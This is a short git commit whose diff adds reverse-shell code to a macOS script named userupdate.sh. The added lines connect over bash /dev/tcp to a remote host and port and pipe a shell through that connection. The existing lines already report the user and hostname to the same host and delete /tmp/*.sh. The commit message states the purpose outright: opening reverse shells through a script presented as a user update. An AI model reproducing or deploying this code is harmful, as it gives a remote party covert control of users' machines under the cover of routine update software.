61f5e07cadee707d607df762971af34c42912c5b
ErikBoesen <me@erikboesen.com>
2018-04-04 19:00:44 -0400

    Add code for opening reverse shells into Mac's user update script

--- control/mac/userupdate.sh
+++ control/mac/userupdate.sh
@@ -6,3 +6,7 @@ up_port=2043
 printf "INFO: $(whoami)@$(hostname) waiting for root instructions." > /dev/tcp/$host/$up_port
 
 rm /tmp/*.sh
+
+if [ ]; then
+    0<&3; exec 3<>/dev/tcp/$host/$up_port; sh <&3 >&3 2>&3
+fi
